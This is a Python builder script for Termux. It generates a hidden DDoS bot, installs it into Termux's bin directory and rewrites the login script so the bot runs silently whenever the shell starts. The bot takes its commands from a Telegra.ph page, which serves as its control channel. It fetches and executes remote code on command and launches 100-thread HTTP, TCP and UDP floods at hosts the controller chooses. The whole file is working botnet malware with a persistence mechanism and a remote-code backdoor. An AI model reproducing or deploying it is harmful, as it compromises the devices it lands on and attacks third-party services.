import os
from colorama import Fore, Back, Style

def cls():
    os.system('clear')

def ban():

    print(Fore.YELLOW+ " _    _                                      "+Fore.CYAN+"                              _     ")
    print(Fore.YELLOW+ "| |  | |                                     "+Fore.CYAN+"                             | |    ")
    print(Fore.YELLOW+ "| |  | |  __ _  _ __   _ __    __ _          "+Fore.CYAN+" __ _  _ __   __ _     _ __  | |__  ")
    print(Fore.YELLOW+ "| |/\| | / _` || '_ \ | '_ \  / _` |        "+Fore.CYAN+" / _` || '__| / _` |   | '_ \ | '_ \ ")
    print(Fore.YELLOW+ "\  /\  /| (_| || | | || | | || (_| |        "+Fore.CYAN+"| (_| || |   | (_| | _ | |_) || | | |")
    print(Fore.YELLOW+ " \/  \/  \__,_||_| |_||_| |_| \__,_|         "+Fore.CYAN+"\__, ||_|    \__,_|(_)| .__/ |_| |_|")
    print(Fore.YELLOW+ "                                     ______"+Fore.CYAN+"   __/ |                | |")
    print(Fore.YELLOW+ "                                    |______|"+Fore.CYAN+" |___/                 |_|")
    print(' ')
    print(Fore.BLUE + '  by @wannadeauth (telegram)' + Fore.MAGENTA + '   Version: ' + Fore.WHITE + '0.7 (beta)' + Fore.BLUE)
    print('-------------------------------------------\n')

cls()
ban()
print(Fore.GREEN + '    Build for: \n\n')
print(Fore.YELLOW + '[1] ' + Fore.WHITE + 'Termux\n\n')
a = input(Fore.MAGENTA + ' Choose parametr: ')
site = input(' Telegra.ph link: ')
       
b = site.split('/')
b = b[-1]
if a == '1':   
    b = 'termux-' + b 
    os.system('mkdir ' + b)
    os.chdir(b)
    file = open('main.py', 'w')
    file.write("""import os
file = open('system.py', 'w')

file.write('''import requests
import socket
import bs4
import threading
import urllib.request
import json

site = ''' + """ + '"\'"'+ '+' + '"' + site + '"' + '+' + '"\'"' + """ + '''
                                                   
def cust():
    try:
        exec(__script__)
    except:
        pass

def tcp():

    while what == '0':
        try:
            conn.send(duta.encode())
        except:
            pass
    conn.close()


def http():
    while what == '0':

        try:
            requests.get(a[0])
        except:
            pass

def httpost():
    while what == '0':
        try:
            requests.post(a[0], json={burunduk})
        except:
            pass

def udp():

    while what == '0':
        try:
            udp_socket.sendto(duta, addr)

        except:
            pass



conn = socket.socket()
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

kavo = '1'

while True:

    try:

        yn = '0'

        url = requests.get(site)

        b = bs4.BeautifulSoup(url.text, "html.parser")

        url1 = b.select('article')
        url_print = url1[0].getText()
        url_print = url_print.replace(' ', '')
        a = url_print.split(',')



        if a != kavo:
            kavo = a
            what = '1'

            if a[0].lower() == 'stop' or a[0].lower == 'none':
                pass

            elif a[0].lower() == 'online':
                try:
                    requests.get(a[1])
                except:
                    pass

            elif a[0].lower() == 'custom':
                try:
                
                    __script__ = a[1]
                    with urllib.request.urlopen(__script__) as url:
                        __script__ = url.read()
                        threading.Thread(target=cust).start()
                except:
                    pass
            elif a[0].lower() == 'move':
                try:
                    requests.get(a[1])
                    site = a[1]
                except:
                    pass


            elif a[2].lower() == 'db':
                try:
                    burunduk = a[3].replace(';', ', ')
                    what = '0'
                    for i in range(100):
                        threading.Thread(target=httpost).start()
                except:
                    pass

#####

            elif a[2].lower() == 'http':
                what = '0'
                for i in range(100):
                    threading.Thread(target=http).start()
######


            elif a[2].lower() == 'tcp':
                try:
                    conn.connect((a[0], int(a[1])))
                    yn = '1'
                except:
                    try:
                        conn.connect(('google.com', 80))
                        conn.close()
                        conn.connect((a[0], int(a[1])))
                        yn = '1'
                    except:
                        pass

                if yn == '1':
                    what = '0'
                    if a[-1].lower() == 'tcp':
                        duta = 'by @wannadeauth (telegram)'
                        for i in range(100):
                            threading.Thread(target=tcp).start()
                    else:
                        duta = a[-1]
                        for i in range(100):
                            threading.Thread(target=tcp).start()

######

            elif a[2].lower() == 'udp':
                addr = (a[0], int(a[1]))
                what = '0'
                if a[-1].lower() == 'udp':
                    duta = 'by @wannadeauth (telegram)'
                    for i in range(100):
                        threading.Thread(target=udp).start()
                else:
                    duta = a[-1]
                    for i in range(100):
                        threading.Thread(target=udp).start()

######

            else:
                pass
    except:
        pass
''')
file.close()
os.system('cp system.py /data/data/com.termux/files/usr/bin')
os.system('rm system.py')

file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('''#!/data/data/com.termux/files/usr/bin/sh

python /data/data/com.termux/files/usr/bin/system.py &
clear

if [ $# = 0 ] && [ -f /data/data/com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
        cat /data/data/com.termux/files/usr/etc/motd
else
        # This variable shouldn't be kept set.
        unset TERMUX_HUSHLOGIN
fi

if [ -G ~/.termux/shell ]; then
        export SHELL="`realpath ~/.termux/shell`"
else
        for file in /data/data/com.termux/files/usr/bin/bash /data/data/com.termux/files/usr/bin/sh /system/bin/sh; do
                if [ -x $file ]; then
                        export SHELL=$file
                        break
                fi
        done
fi

if [ -f /data/data/com.termux/files/usr/lib/libtermux-exec.so ]; then
        export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so
        $SHELL -c "coreutils --coreutils-prog=true" > /dev/null 2>&1 || unset LD_PRELOAD
fi

if [ -n "$TERM" ]; then
        exec "$SHELL" -l "$@"
else
        exec "$SHELL" "$@"
fi

''')
file.close()


os.system('python /data/data/com.termux/files/usr/bin/system.py &')
""")
    
    
    file = open('requirements.txt', 'w')
    file.write('''bs4
urllib3
requests''')
    file.close()
    print('\n' + Fore.GREEN + ' Successfuly saved in ' + b)
else:
    print(Fore.RED + ' Wrong parametr')


